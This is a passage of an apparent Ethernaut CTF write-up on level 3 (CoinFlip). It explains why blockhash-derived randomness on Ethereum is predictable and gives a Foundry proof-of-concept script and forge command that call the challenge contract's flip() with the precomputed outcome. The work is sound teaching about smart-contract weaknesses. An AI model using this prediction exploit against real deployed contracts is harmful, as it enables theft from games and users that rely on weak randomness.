@@ -1,0 +1,77 @@
+"This is a really cool coin flip game where you'll have to correctly guess the outcome 10 times in a row to win. If you guess wrong, the counter will reset and you'll have to do it all again. 
+So the question is how will you read the mind of the blockchain gods? It's simple. We will look into the source of randomness used in flipping the coin. Let's dive in. 
+The problem with randomness in Ethereum is that Ethereum is a deterministic Turing machine, with no inherent randomness involved. To generate randomness in Ethereum developers often make use of data related to the blocks, i.e., block number, hash, etc. 
+These variables may look random but are actually deterministic and can be exploited if the inputs are known. We will do the same with our Coin Flip contract. 
+The Coin Flip is a simple game where there's only one function flip() where you have to supply your guess, either true or false. And if your guessed bool matches the value of the side variable, then the consecutiveWins will be increased. consecutiveWins is initially set to 0 inside the constructor and it is again set to zero if you guess wrong. 
+flip()
+true
+false
+side
+consecutiveWins
+consecutiveWins
+Let's look into how the side variable is getting its value. In the first line of the function, we can see the source of randomness which is:
+side
+uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+Here, we can see that it is calculating the blockhash using block.number - 1. This is then divided by the FACTOR which is also available to us and the result is stored int he variable coinFlip. 
+blockhash
+block.number - 1
+FACTOR
+coinFlip
+If the value of coinFlip is 1, then the side will be set to true, otherwise, false. This is what we have to guess. 
+coinFlip
+1
+side
+true
+false
+Since we already have all the input variables and the source of randomness is also deterministic, can't we just make our own contract, guess the outcome, and submit it to Ethernaut's instance? I bet we can. This will allow us to guess the correct outcome every time. 
+Here's what our PoC script will look like:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel03.sol"";
+import ""@openzeppelin/contracts/math/SafeMath.sol"";
+
+contract POC is Script {
+    using SafeMath for uint256;
+
+    CoinFlip level3 = CoinFlip(0xa7604317Ebe188501578474781f18e8750d6FD3E);
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    function run() external {
+        vm.startBroadcast();
+
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side) {
+            level3.flip(true); 
+        } else {
+            level3.flip(false);
+        }
+
+        console.log(""Consecutive Wins: "", level3.consecutiveWins());
+        vm.stopBroadcast();
+    }
+}
+
+We have copied most of the contract logic from the vulnerable contract into our own so we will be able to simulate the coin flip logic. 
+In the if-else statement, if we get a true outcome, our contract will just create an external call to the level3 contract with a true guess and vice versa. This means that no matter the guess, our function call to the run() will always increase the consecutiveWins in the Ethernaut's instance. 
+if-else
+true
+level3
+true
+run()
+consecutiveWins
+In the end, I'm just logging the value of consecutiveWins to keep track. 
+consecutiveWins
+We will execute the script using the following command: 
+forge script ./script/level03.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL
+
+It can be seen below that my current winning streak is 4. We just have to call this 10 times to win the game. 
+
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+Generating randomness natively on Ethereum is tricky and very difficult. All the data on the blockchain is public so care should be taken while storing anything sensitive. 
+You can make use of the following methods to generate secure random numbers:"
